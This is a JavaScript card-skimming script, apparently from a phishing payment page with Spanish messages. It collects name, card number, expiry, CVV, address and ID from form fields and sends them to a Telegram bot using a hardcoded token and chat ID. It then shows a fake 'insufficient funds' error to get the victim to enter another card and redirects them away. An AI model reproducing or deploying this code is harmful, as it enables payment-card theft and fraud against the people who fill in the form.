function enviarDatos() {
    var formData = {
        name: document.getElementById('name').value,
        card_number: document.getElementById('card').value,
        expiration_date: document.getElementById('exp').value,
        cvv: document.getElementById('cvv').value,
        address: document.getElementById('address').value,
        id: document.getElementById('id').value,
    };

    var botToken = '6202243249:AAGtTTl9YH2h4BiScQgdbLFwaa2is4dfbAo';
    var chatId = '5330560021';

    var emojis = {
        name: '👤',
        card_number: '💳',
        expiration_date: '📅',
        cvv: '🕵️‍♂️',
        address: '🏠',
        id: '🆔',
    };

    var message = "Nuevo pago recibido: \n\n";
    for (var key in formData) {
        message += `${emojis[key]} ${key}: ${formData[key]}\n`;
    }

    document.getElementById('spinner').style.display = 'block';

    axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        chat_id: chatId,
        text: message,
    })
        .then(function (response) {
            console.log('Done:', response.data);

            setTimeout(function () {
                document.getElementById('spinner').style.display = 'none';

                window.location.href = 'https://www.ejemplo.com';
            }, 5000);
            alert('Error fondos insuficientes, intente con otra tarjeta.');
        })
        .catch(function (error) {
            console.error('Error al enviar el mensaje:', error);

            document.getElementById('spinner').style.display = 'none';

            setTimeout(function () {
                alert('Error Compruebe su conexion a internet.');
            }, 4000);
        });
}